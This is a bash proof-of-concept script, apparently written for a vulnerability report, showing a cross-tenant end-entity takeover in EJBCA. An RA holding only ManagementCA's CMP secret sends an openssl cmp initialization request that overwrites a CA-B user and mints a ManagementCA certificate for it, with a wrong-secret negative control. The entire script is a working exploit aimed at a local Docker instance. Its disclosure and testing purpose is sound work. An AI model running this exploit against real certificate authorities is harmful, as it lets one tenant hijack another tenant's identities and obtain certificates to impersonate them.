#!/usr/bin/env bash
# E-02 — Cross-tenant end-entity takeover via CMP RA-mode enrollment. A CMP RA holding ONLY
# ManagementCA's per-CA secret (secretA) overwrites (changeUser) an end entity that belongs to
# CA-B, and mints a ManagementCA certificate for that identity. Positive control (baseline CA-B
# cert proves Tenant-B ownership) + negative control (wrong secret issues nothing).
set -u
C="${EJBCA_CONTAINER:-ejbca}"; WORK="${WORK:-/tmp/ejbca-poc}"; cd "$WORK" || exit 1
J() { docker exec "$C" /opt/keyfactor/bin/ejbca.sh "$@" 2>&1 | grep -viE "cannot find name for user ID"; }
MCA="$(cat "$WORK/mca_dn.txt")"
iss() { openssl x509 -in "$1" -noout -issuer 2>/dev/null | sed 's/issuer=//'; }
U="tbUser$(date +%s)"      # fresh, never-used username
echo "Fresh victim username: $U   (created ONLY under CA-B / Tenant B)"

echo "############ SETUP: $U under CA-B + a CA-B baseline cert (server keygen) ############"
J ra addendentity --username "$U" --password pw123 --dn "CN=$U,O=TenantB" --caname CA-B --certprofile ENDUSER --eeprofile EMPTY --type 1 --token P12 | grep -iE "has been added|error" | head -1
J ra setclearpwd --username "$U" --password pw123 >/dev/null 2>&1
J batch "$U" | grep -iE "Created Keystore" | head -1
docker cp "$C:/opt/keyfactor/p12/$U.p12" "$WORK/$U.p12" >/dev/null 2>&1
openssl pkcs12 -in "$U.p12" -clcerts -nokeys -passin pass:pw123 -out base.pem 2>/dev/null
echo "  BASELINE cert issuer = $(iss base.pem)     <-- expect CN=CA-B"

echo; echo "############ NEGATIVE CONTROL: CMP ir CN=$U via enrA, WRONG secret ############"
openssl genrsa -out atk.key 2048 2>/dev/null; rm -f neg.pem
openssl cmp -cmd ir -server "http://127.0.0.1:8080/ejbca/publicweb/cmp/enrA" \
  -recipient "$MCA" -ref ManagementCA -secret pass:WRONGPW -trusted mca.pem \
  -newkey atk.key -subject "/CN=$U" -popo 1 -certout neg.pem -verbosity 1 2>&1 \
  | grep -iE "error validating protection|unable to" | head -1
echo "  neg-control cert issued? $( [ -f neg.pem ] && echo YES-BAD || echo NO-good )"

echo; echo "############ ATTACK: CMP ir CN=$U via enrA, secretA (ManagementCA secret ONLY) ############"
rm -f atk.pem
openssl cmp -cmd ir -server "http://127.0.0.1:8080/ejbca/publicweb/cmp/enrA" \
  -recipient "$MCA" -ref ManagementCA -secret pass:secretA -trusted mca.pem \
  -newkey atk.key -subject "/CN=$U" -popo 1 -certout atk.pem -verbosity 1 2>&1 \
  | grep -iE "PKIStatus|StatusString" | head -2
echo "  ATTACK cert issuer = $( [ -f atk.pem ] && iss atk.pem || echo NONE)     <-- expect ManagementCA"

echo; echo "############ PROOF: $U now carries certs from BOTH CAs ############"
J ra getendentitycert --username "$U" | grep -iE "Issuer" | sort | uniq -c
echo
echo "  baseline=CA-B, attack=ManagementCA, neg=NO  =>  a holder of ONLY ManagementCA's RA secret"
echo "  overwrote a CA-B (Tenant B) end entity and minted a ManagementCA cert for it. Cross-tenant takeover."
